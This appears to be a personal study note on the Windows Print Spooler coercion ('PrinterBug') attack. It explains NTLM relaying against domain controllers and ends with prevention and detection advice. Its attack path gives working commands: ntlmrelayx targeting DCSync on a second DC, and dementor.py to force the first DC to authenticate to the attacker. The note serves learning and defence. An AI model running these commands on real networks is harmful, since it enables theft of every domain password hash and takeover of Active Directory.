### General Notes

The *print spooler* service is enabled by default and it is vulnerable to an exploit that allows a remote computer to connect to another computer of choice that it can reach.
- Any remote [[Objects#Users|User]] can coerce a remote machine to *authenticate* to another machine using a [[Kerberos]] *TGT*, this is called *relaying*.

**Relaying** a connection is taking the authentication attempt from a computer and acting as the middle man and sending it to another computer.
- The attacker forces a machine to authenticate to them, and instead of keeping that connection, the attacker *relays* it to another service.
- The target service believes that the initial machine is the one authenticating.
###### Print Spooler
The *print spooler* is an executable file that manages the printing process.
###### Impact on [[Domain Controller]]s
If any Domain Controller has *print spooler* service enabled - knowing it is the most powerful machine in the [[Active Directory]] domain - an attacker can force the DC to authenticate elsewhere. 

The following attacks are possible:
1. The attacker can authenticate to another DC, and perform a [[DCSync]] attack to extract all the password hashes of the Active Directory. This is the case if [[Server Message Block (SMB)]] signing is off.
2. Relay the authentication to *Active Directory Certificate Services* to obtain a [[Certificates|Certificate]] for the [[Domain Controller]] that can be used by attackers to pretend to be the Domain Controller.
3. The attacker can relay the connection to a machine with [[Kerberos Constrained Delegation Attack#Delegation|Unconstrained Delegation]] enabled, which causes that server to obtain the DC's *TGT*. The attacker can them dump the *TGT* of the DC from the server and impersonate the DC.

---
### Attack Path for [[DCSync]]

The idea here is to trick DC1 that has the print spooler enabled to connect to the attacker machine.
- The attacker machine then *relays* that authentication to DC2 and tries to perform the DCSync attack.

We set up the relay at the attacker machine:
```bash
impacket-ntlmrelayx -t dcsync://<DC2-IP> -smb2support
```
- The target here which is specified using `-t` is the DC at the given IP address and using the `dcsync` module.
- Add the `-smb2support` flag to support the SMBv2 [[Protocol]] which makes the relay work.

Now that the relay is operational, we need to trigger the printer bug exploit to make DC1 connect to the attacker machine hosting the relay:
- This can be done using [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) from a non-domain joined machine and using any authenticated user on the domain.
```bash
python3 ./dementor.py <DC1_IP> <Attacker_IP> -u <DomainUser> -d <DomainName> -p <Password>
```

Now, if we open the terminal session with the relay open, we will get the Kerberos ticket for the domain controller, as well as the password hashes.

---
### Prevention & Detection

Print Spooler should be disabled on all servers that are not printing servers. 

Additionally, there is an option to prevent the abuse of the `PrinterBug` while keeping the service running: 
- The [[Windows Registry]] Key `RegisterSpoolerRemoteRpcEndPoint` can be set to `2` to disable any remote requests at `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers`.

To detect this, look for [[Windows Events Log]] events with the successful logon ID where the source of login is coming from a weird IP address and the destination is a [[Domain Controller]].

